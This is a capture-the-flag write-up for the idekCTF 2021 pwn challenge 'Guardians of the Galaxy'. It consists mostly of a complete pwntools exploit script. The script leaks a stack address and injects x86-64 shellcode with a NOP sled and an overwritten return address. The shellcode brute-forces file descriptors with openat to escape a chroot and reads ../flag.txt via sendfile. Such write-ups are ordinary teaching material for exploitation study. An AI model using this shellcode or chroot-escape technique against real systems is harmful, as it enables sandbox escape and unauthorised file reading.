**Guardians of the Galaxy**

was pwn challenge from idekCTF 2021

A sort of chroot escape shellcode, with a seccomp..

The goal was to find the only remaining filedescriptor opened outside the chroot,

to access file ../flag.txt relatively to this filedescriptor with openat function..

for doing this we just start from highest possible fd number (1003 in this case..)

and we decrease it until we can open ../flag.txt relatively to this fd..

when we have found the good one ..it just works...

simple as 1...2...3...

![](https://github.com/nobodyisnobody/write-ups/raw/main/idekCTF.2021/pwn/Guardians.of.the.Galaxy/pics/gotshell.gif)

the exploit:

```python3
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'info'

exe = ELF('./rocket')

host, port = "gotg.chal.idek.team", "1337"

if args.REMOTE:
  p = remote(host,port)
else:
  p = remote('127.0.0.1', 1337)

p.recvuntil('journey:',drop=True)

leak = int(p.recvuntil('\n',drop=True),16)
print('stack leak = '+hex(leak))

shellc = asm('''
  mov ebp,1003
loopy:
  mov edi,ebp
  push 257
  pop rax
  lea rsi,fname[rip]
  xor edx,edx
  push rdx
  pop r10
  syscall
  cmp rax,3
  jge next
  dec ebp
  jnz loopy
next:
 
  push rax
  pop rsi
  push 40
  pop rax
  push 1
  pop rdi
  xor edx,edx
  mov r10,64
  syscall

  push 60
  pop rax
  syscall
fname:
  .string "../flag.txt"
''')

print(hexdump(shellc))

payload = shellc.ljust(0x820,b'\x90')+p64(leak+0x820)+p64(leak)

p.sendline(payload)

p.interactive()
```

*nobodyisnobody still pwning things*

